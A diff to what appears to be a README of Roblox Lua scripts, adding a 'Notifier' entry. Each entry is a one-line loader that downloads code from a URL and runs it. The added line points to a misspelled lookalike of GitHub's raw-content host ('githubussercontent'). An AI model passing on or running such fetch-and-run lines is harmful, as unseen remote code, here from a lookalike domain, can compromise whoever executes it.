@@ -17,3 +17,10 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/marik611377/scripts/r
 ```lua
 loadstring(game:HttpGet('https://raw.githubusercontent.com/marik611377/scripts/refs/heads/main/jjsshower.txt'))()
 ```
+---
+**Universal**
+<br/>
+*Notifier*
+```lua
+loadstring(game:HttpGet('https://raw.githubussercontent.com/marik611377/scripts/refs/heads/main/notifier.lua'))()
+```
